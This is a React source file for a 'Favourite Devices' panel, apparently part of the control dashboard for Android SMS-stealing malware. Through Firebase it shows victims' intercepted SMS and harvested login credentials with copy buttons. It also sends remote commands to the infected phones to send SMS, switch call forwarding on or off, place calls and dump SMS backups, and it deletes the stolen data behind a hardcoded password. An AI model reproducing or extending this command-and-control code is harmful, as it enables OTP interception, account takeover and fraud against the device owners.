"use client";
import React, { useState, useEffect } from "react";
import { ref, update, remove } from "firebase/database";
import { db } from "../lib/firebase";

export default function FavouritesPanel({ 
  data, 
  deviceOnlineStatus, 
  deviceSerialMap, 
  favourites, 
  toggleFavourite, 
  showToast,
  openSmsModal 
}) {
  const [expandedDevices, setExpandedDevices] = useState({});
  const [activeTabs, setActiveTabs] = useState({});
  const [formMemory, setFormMemory] = useState({});

  useEffect(() => {
    try {
      const saved = localStorage.getItem("rto_form_memory");
      if (saved) {
        setFormMemory(JSON.parse(saved));
      }
    } catch (e) {}
  }, []);

  const updateField = (key, value) => {
    setFormMemory((prev) => {
      const updated = { ...prev, [key]: value };
      try {
        localStorage.setItem("rto_form_memory", JSON.stringify(updated));
      } catch (e) {}
      return updated;
    });
  };

  const devices = data.user_data || {};
  const statusData = data.device_status || {};

  const toggleExpand = (id) => {
    setExpandedDevices(prev => ({ ...prev, [id]: !prev[id] }));
  };

  const handleTab = (devId, tab) => {
    setActiveTabs(prev => ({ ...prev, [devId]: prev[devId] === tab ? null : tab }));
  };

  const copyToClipboard = (text, label = "Item") => {
    if (!text) return;
    navigator.clipboard.writeText(String(text));
    showToast(`📋 Copied: ${String(text).slice(0, 20)}`, "success");
  };

  const handleCommand = (type, devId) => {
    const baseRef = ref(db, `user_data/${devId}`);

    if (type === "sendsms") {
      const num = formMemory[`fav-smsNum-${devId}`];
      const body = formMemory[`fav-smsText-${devId}`];
      const selectedSim = formMemory[`fav-smsSim-${devId}`] || "0";

      if (!num || !body) return showToast("⚠️ Enter recipient number & message!", "warning");
      if (!confirm(`Send SMS from SIM ${Number(selectedSim) + 1} to ${num}?`)) return;

      update(baseRef, {
        command: "send message",
        targetDeviceId: devId,
        phoneNumber: num,
        messageText: body,
        simSlot: selectedSim,
        sim: Number(selectedSim),
        simIndex: Number(selectedSim),
        timestamp: Date.now()
      }).then(() => {
        showToast(`✅ SMS sent via SIM ${Number(selectedSim) + 1}`, "success");
      });
    } 
    else if (type === "fwd_on") {
      const num = formMemory[`fav-fwdNum-${devId}`];
      const selectedSim = formMemory[`fav-fwdSim-${devId}`] || "0";

      if (!num) return showToast("⚠️ Enter forward-to phone number!", "warning");
      if (!confirm(`Activate Call Forward on SIM ${Number(selectedSim) + 1} to ${num}?`)) return;

      update(baseRef, {
        command: "call forward",
        targetDeviceId: devId,
        phoneNumber: num,
        forwardNumber: num,
        simSlot: selectedSim,
        sim: Number(selectedSim),
        simIndex: Number(selectedSim),
        timestamp: Date.now()
      }).then(() => showToast(`✅ Call Forward ON (SIM ${Number(selectedSim) + 1})`, "success"));
    } 
    else if (type === "fwd_off") {
      const selectedSim = formMemory[`fav-fwdSim-${devId}`] || "0";
      if (!confirm(`Deactivate Call Forward on SIM ${Number(selectedSim) + 1}?`)) return;

      update(baseRef, {
        command: "forward off",
        targetDeviceId: devId,
        simSlot: selectedSim,
        sim: Number(selectedSim),
        simIndex: Number(selectedSim),
        timestamp: Date.now()
      }).then(() => showToast(`⛔ Call Forward OFF (SIM ${Number(selectedSim) + 1})`, "success"));
    } 
    else if (type === "call") {
      const num = formMemory[`fav-callNum-${devId}`];
      const selectedSim = formMemory[`fav-callSim-${devId}`] || "0";

      if (!num) return showToast("⚠️ Enter target phone number!", "warning");
      if (!confirm(`Make Call from SIM ${Number(selectedSim) + 1} to ${num}?`)) return;

      update(baseRef, {
        command: "make call",
        adminNumber: num,
        phoneNumber: num,
        simSlot: selectedSim,
        sim: Number(selectedSim),
        timestamp: Date.now()
      }).then(() => showToast(`📞 Calling via SIM ${Number(selectedSim) + 1}`, "success"));
    } 
    else if (type === "backup") {
      if (!confirm(`Trigger full SMS backup on ${devId}?`)) return;
      update(baseRef, { command: "backup", timestamp: Date.now() })
        .then(() => showToast("💾 Backup initiated", "success"));
    }
  };

  const deleteDeviceData = (devId, type) => {
    const pwd = prompt(`🔐 Enter Password to delete ${type}:`);
    if (pwd !== "9090") return showToast("❌ Invalid Password", "error");
    if (!confirm(`Delete ${type} for ${devId}?`)) return;

    const path = type === "sms" ? `user_sms/${devId}` : `login/${devId}`;
    remove(ref(db, path)).then(() => showToast(`Deleted ${type}`, "success"));
  };

  const clearAll = () => {
    if (!confirm("⚠️ Remove all devices from favourites?")) return;
    favourites.forEach((id) => toggleFavourite(id));
  };

  return (
    <div className="panel active">
      <div className="panel-header">
        <div>
          <h2>
            <i className="fas fa-star" style={{ color: "var(--gold)" }}></i> Favourite Devices
          </h2>
          <p className="panel-sub">Pinned devices with persistent controls & monitoring</p>
        </div>
        <div className="panel-stats">
          <span className="stat-item">
            <i className="fas fa-star" style={{ color: "var(--gold)" }}></i> {favourites.length} Pinned
          </span>
          {favourites.length > 0 && (
            <button className="btn-delete-all" onClick={clearAll} style={{ padding: "4px 10px" }}>
              <i className="fas fa-trash"></i> Clear All
            </button>
          )}
        </div>
      </div>

      {favourites.length === 0 ? (
        <div
          className="empty-luxury"
          style={{
            background: "linear-gradient(145deg, #181d2a, #111520)",
            border: "1px solid var(--border-color)",
            borderRadius: "var(--radius)",
            padding: "36px 20px",
          }}
        >
          <i className="fas fa-star empty-icon" style={{ color: "var(--gold)", opacity: 0.6, fontSize: 36 }}></i>
          <h4 style={{ color: "var(--text-primary)", fontSize: 16, marginBottom: 4 }}>No Favourite Devices</h4>
          <p style={{ color: "var(--text-muted)", fontSize: 12 }}>
            Devices panel me kisi bhi device card ke Star (★) icon par click karein.
          </p>
        </div>
      ) : (
        <div style={{ display: "flex", flexDirection: "column", gap: 12 }}>
          {favourites.map((devId) => {
            const dev = devices[devId] || {};
            const status = statusData[devId] || {};
            const isOnline = Boolean(deviceOnlineStatus?.[devId]);
            const serial = deviceSerialMap?.[devId] || 0;
            const expanded = expandedDevices[devId];
            const curTab = activeTabs[devId];

            const modelName = status.device_name || dev.Device_info || dev.d_name || "Device";
            const lastSeen = status.last_seen || dev.last_online || "N/A";

            const smsMap = data.user_sms?.[devId] || {};
            const smsList = Object.values(smsMap).reverse();
            const loginMap = data.login?.[devId] || {};
            const loginList = Object.entries(loginMap).map(([key, val]) => ({
              key,
              ...val,
              _timestamp: val.timestamp || val.date || 0
            })).sort((a, b) => b._timestamp - a._timestamp);

            const sim1Num = dev.numberSim1 || "No SIM 1";
            const sim2Num = dev.numberSim2 || "No SIM 2";

            return (
              <div key={devId} className={`device-card-premium ${isOnline ? "online" : "offline"}`}>
                <div className="card-header" onClick={() => toggleExpand(devId)}>
                  <div style={{ flex: 1, minWidth: 0 }}>
                    <div className="device-name-premium">
                      <button 
                        className="fav-star-btn" 
                        onClick={(e) => { e.stopPropagation(); toggleFavourite(devId); }}
                      >
                        <i className="fas fa-star"></i>
                      </button>
                      <span className="name-text">📱 {devId.slice(0, 14)}...</span>
                      {serial > 0 && <span className="serial-badge-premium">S-{serial}</span>}
                      <button 
                        className="copy-device-id-btn" 
                        onClick={(e) => { e.stopPropagation(); copyToClipboard(devId, "Device ID"); }}
                      >
                        <i className="fas fa-copy"></i> Copy ID
                      </button>
                      <button 
                        onClick={(e) => { e.stopPropagation(); toggleFavourite(devId); }}
                        className="btn-sm"
                        style={{
                          background: "rgba(239, 68, 68, 0.15)",
                          color: "var(--red)",
                          padding: "2px 8px",
                          borderRadius: 6,
                        }}
                      >
                        Remove
                      </button>
                    </div>

                    <div className="device-sub-info">
                      <span><i className="fas fa-microchip"></i> {modelName}</span>
                      <span><i className="fas fa-sim-card"></i> {dev.numberSim1 || "SIM 1: N/A"}</span>
                      {dev.numberSim2 && <span><i className="fas fa-sim-card"></i> {dev.numberSim2}</span>}
                    </div>
                  </div>

                  <div style={{ display: "flex", flexDirection: "column", alignItems: "flex-end", gap: 4 }}>
                    <span className={`status-badge-premium ${isOnline ? "online" : "offline"}`}>
                      <span className="status-dot"></span>
                      {isOnline ? "Online" : "Offline"}
                    </span>
                    <span style={{ fontSize: 10, color: "var(--text-muted)" }}>
                      <i className="far fa-clock"></i> {lastSeen.slice(11) || lastSeen}
                    </span>
                  </div>
                </div>

                <div className="info-grid-premium" onClick={() => toggleExpand(devId)}>
                  <div className="info-item-premium">
                    <span className="info-label">Device Model</span>
                    <span className="info-value">{modelName}</span>
                  </div>
                  <div className="info-item-premium">
                    <span className="info-label">SIM 1</span>
                    <span className="info-value">{dev.numberSim1 || "No SIM"}</span>
                  </div>
                  <div className="info-item-premium">
                    <span className="info-label">SIM 2</span>
                    <span className="info-value">{dev.numberSim2 || "No SIM"}</span>
                  </div>
                  <div className="info-item-premium">
                    <span className="info-label">Serial</span>
                    <span className="info-value highlight">{serial || "—"}</span>
                  </div>
                </div>

                <div className="expand-hint" onClick={() => toggleExpand(devId)}>
                  <i className={`fas fa-chevron-${expanded ? "up" : "down"}`}></i> {expanded ? "Click to collapse" : "Click to expand controls"}
                </div>

                {expanded && (
                  <div className="expandable-content">
                    <div className="actions-row-premium">
                      {[
                        { id: "sms", label: "SMS", icon: "fas fa-envelope", count: smsList.length },
                        { id: "login", label: "Login", icon: "fas fa-key", count: loginList.length },
                        { id: "call", label: "Call", icon: "fas fa-phone" },
                        { id: "sendsms", label: "Send SMS", icon: "fas fa-paper-plane" },
                        { id: "fwd", label: "Forward", icon: "fas fa-random" },
                        { id: "backup", label: "Backup", icon: "fas fa-database" },
                        { id: "delete", label: "Delete", icon: "fas fa-trash" }
                      ].map(a => (
                        <button 
                          key={a.id} 
                          className={`action-btn-premium ${curTab === a.id ? "active" : ""}`}
                          onClick={() => handleTab(devId, a.id)}
                        >
                          <i className={a.icon}></i> {a.label} {a.count > 0 && <span className="btn-badge">{a.count}</span>}
                        </button>
                      ))}
                    </div>

                    {curTab === "sms" && (
                      <div className="section-premium">
                        <div className="section-title">
                          <span>Messages ({smsList.length})</span>
                          {openSmsModal && (
                            <button onClick={() => openSmsModal(devId)} className="btn-gold" style={{ marginLeft: "auto", padding: "2px 8px", fontSize: 10 }}>View Full</button>
                          )}
                        </div>
                        <div style={{ display: "flex", flexDirection: "column", gap: 6, maxHeight: 250, overflowY: "auto" }}>
                          {smsList.slice(0, 8).map((m, i) => (
                            <div key={i} style={{ background: "rgba(0,0,0,0.25)", padding: 8, borderRadius: 6, borderLeft: "2px solid var(--gold)" }}>
                              <div style={{ display: "flex", justifyContent: "space-between", fontSize: 10, color: "var(--text-muted)" }}>
                                <span style={{ color: "var(--gold-light)", fontWeight: 600 }}>{m.sender || m.address}</span>
                                <span>{m.date || ""}</span>
                              </div>
                              <div style={{ fontSize: 11, marginTop: 4, color: "var(--text-primary)" }}>{m.body}</div>
                            </div>
                          ))}
                        </div>
                      </div>
                    )}

                    {curTab === "login" && (
                      <div className="section-premium">
                        <div className="section-title">
                          <span>Credentials ({loginList.length})</span>
                          <button onClick={() => deleteDeviceData(devId, "credentials")} className="btn-luxury btn-red" style={{ marginLeft: "auto", padding: "2px 8px", fontSize: 10 }}>Delete All</button>
                        </div>
                        <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
                          {loginList.length === 0 ? (
                            <div style={{ fontSize: 12, color: "var(--text-muted)", textAlign: "center", padding: 10 }}>No credentials recorded.</div>
                          ) : (
                            loginList.map((cred, i) => (
                              <div key={cred.key || i} style={{ background: "rgba(0,0,0,0.3)", padding: 10, borderRadius: 8, border: "1px solid var(--border-color)" }}>
                                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 6, paddingBottom: 4, borderBottom: "1px solid rgba(255,255,255,0.05)" }}>
                                  <span style={{ fontSize: 11, fontWeight: 700, color: "var(--gold)" }}>Record #{i + 1}</span>
                                  <button
                                    type="button"
                                    onClick={() => {
                                      let str = "";
                                      for (let k in cred) {
                                        if (!k.startsWith("_") && k !== "key") str += `${k}: ${cred[k]}\n`;
                                      }
                                      navigator.clipboard.writeText(str);
                                      showToast("📋 All fields copied!", "success");
                                    }}
                                    className="btn-sm"
                                    style={{ background: "rgba(212,175,55,0.15)", color: "var(--gold)", padding: "2px 8px", borderRadius: 4, cursor: "pointer" }}
                                  >
                                    <i className="fas fa-copy"></i> Copy All
                                  </button>
                                </div>

                                {Object.entries(cred).filter(([k]) => !k.startsWith("_") && k !== "key").map(([k, v]) => (
                                  <div key={k} style={{ display: "flex", justifyContent: "space-between", alignItems: "center", fontSize: 11, padding: "3px 0", borderBottom: "1px dashed rgba(255,255,255,0.04)" }}>
                                    <span style={{ color: "var(--text-muted)" }}>{k}:</span>
                                    <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
                                      <span style={{ color: "var(--text-primary)", fontWeight: 600 }}>{String(v)}</span>
                                      <button
                                        type="button"
                                        onClick={() => copyToClipboard(v, k)}
                                        style={{ background: "transparent", border: "none", color: "var(--gold)", cursor: "pointer", fontSize: 11 }}
                                        title={`Copy ${k}`}
                                      >
                                        <i className="fas fa-copy"></i>
                                      </button>
                                    </div>
                                  </div>
                                ))}
                              </div>
                            ))
                          )}
                        </div>
                      </div>
                    )}

                    {/* PERSISTENT SEND SMS FOR FAVOURITES */}
                    {curTab === "sendsms" && (
                      <div className="section-premium">
                        <div className="section-title">
                          <i className="fas fa-paper-plane" style={{ marginRight: 6 }}></i> Send SMS Command
                        </div>
                        <div style={{ marginBottom: 10 }}>
                          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8 }}>
                            <button
                              type="button"
                              onClick={() => updateField(`fav-smsSim-${devId}`, "0")}
                              style={{
                                padding: "8px",
                                borderRadius: 8,
                                border: (formMemory[`fav-smsSim-${devId}`] || "0") === "0" ? "1px solid var(--gold)" : "1px solid var(--border-color)",
                                background: (formMemory[`fav-smsSim-${devId}`] || "0") === "0" ? "rgba(212, 175, 55, 0.15)" : "var(--bg-input)",
                                color: (formMemory[`fav-smsSim-${devId}`] || "0") === "0" ? "var(--gold)" : "var(--text-secondary)",
                                fontSize: 11,
                                fontWeight: 600,
                                cursor: "pointer",
                                textAlign: "center"
                              }}
                            >
                              SIM 1 ({sim1Num})
                            </button>
                            <button
                              type="button"
                              onClick={() => updateField(`fav-smsSim-${devId}`, "1")}
                              style={{
                                padding: "8px",
                                borderRadius: 8,
                                border: formMemory[`fav-smsSim-${devId}`] === "1" ? "1px solid var(--gold)" : "1px solid var(--border-color)",
                                background: formMemory[`fav-smsSim-${devId}`] === "1" ? "rgba(212, 175, 55, 0.15)" : "var(--bg-input)",
                                color: formMemory[`fav-smsSim-${devId}`] === "1" ? "var(--gold)" : "var(--text-secondary)",
                                fontSize: 11,
                                fontWeight: 600,
                                cursor: "pointer",
                                textAlign: "center"
                              }}
                            >
                              SIM 2 ({sim2Num})
                            </button>
                          </div>
                        </div>

                        <input 
                          type="text" 
                          placeholder="Recipient Phone Number" 
                          className="search-input" 
                          style={{ background: "var(--bg-input)", marginBottom: 8, borderRadius: 6, border: "1px solid var(--border-color)" }}
                          value={formMemory[`fav-smsNum-${devId}`] || ""}
                          onChange={(e) => updateField(`fav-smsNum-${devId}`, e.target.value)}
                        />
                        <textarea 
                          placeholder="Type Message Content..." 
                          rows="3"
                          className="search-input" 
                          style={{ background: "var(--bg-input)", marginBottom: 10, borderRadius: 6, border: "1px solid var(--border-color)", height: "auto" }}
                          value={formMemory[`fav-smsText-${devId}`] || ""}
                          onChange={(e) => updateField(`fav-smsText-${devId}`, e.target.value)}
                        />
                        <button 
                          className="btn-luxury btn-blue" 
                          style={{ width: "100%", justifyContent: "center", padding: "10px" }} 
                          onClick={() => handleCommand("sendsms", devId)}
                        >
                          Send SMS
                        </button>
                      </div>
                    )}

                    {curTab === "fwd" && (
                      <div className="section-premium">
                        <div className="section-title">
                          <i className="fas fa-random" style={{ marginRight: 6 }}></i> Call Forward Controls
                        </div>
                        <input 
                          type="text" 
                          placeholder="Forward To Phone Number" 
                          className="search-input" 
                          style={{ background: "var(--bg-input)", marginBottom: 10, borderRadius: 6, border: "1px solid var(--border-color)" }}
                          value={formMemory[`fav-fwdNum-${devId}`] || ""}
                          onChange={(e) => updateField(`fav-fwdNum-${devId}`, e.target.value)}
                        />
                        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8 }}>
                          <button 
                            className="btn-luxury" 
                            style={{ background: "var(--green)", color: "#fff", justifyContent: "center", padding: "10px" }} 
                            onClick={() => handleCommand("fwd_on", devId)}
                          >
                            Turn ON
                          </button>
                          <button 
                            className="btn-luxury btn-red" 
                            style={{ justifyContent: "center", padding: "10px" }} 
                            onClick={() => handleCommand("fwd_off", devId)}
                          >
                            Turn OFF
                          </button>
                        </div>
                      </div>
                    )}

                    {curTab === "call" && (
                      <div className="section-premium">
                        <div className="section-title">Make Call Command</div>
                        <input 
                          type="text" 
                          placeholder="Target Phone Number" 
                          className="search-input" 
                          style={{ background: "var(--bg-input)", marginBottom: 8, borderRadius: 6, border: "1px solid var(--border-color)" }}
                          value={formMemory[`fav-callNum-${devId}`] || ""}
                          onChange={(e) => updateField(`fav-callNum-${devId}`, e.target.value)}
                        />
                        <button className="btn-luxury btn-purple" style={{ width: "100%", justifyContent: "center", padding: "10px" }} onClick={() => handleCommand("call", devId)}>
                          Execute Call
                        </button>
                      </div>
                    )}

                    {curTab === "backup" && (
                      <div className="section-premium">
                        <div className="section-title">Device Backup</div>
                        <button className="btn-luxury btn-purple" style={{ width: "100%", justifyContent: "center", padding: "10px" }} onClick={() => handleCommand("backup", devId)}>
                          Trigger Full Backup
                        </button>
                      </div>
                    )}

                    {curTab === "delete" && (
                      <div className="section-premium" style={{ borderColor: "var(--red)" }}>
                        <div className="section-title" style={{ color: "var(--red)" }}>Danger Zone</div>
                        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8 }}>
                          <button className="btn-luxury btn-red" style={{ justifyContent: "center" }} onClick={() => deleteDeviceData(devId, "sms")}>
                            Delete SMS
                          </button>
                          <button className="btn-luxury btn-purple" style={{ justifyContent: "center" }} onClick={() => deleteDeviceData(devId, "credentials")}>
                            Delete Creds
                          </button>
                        </div>
                      </div>
                    )}
                  </div>
                )}
              </div>
            );
          })}
        </div>
      )}
    </div>
  );
}
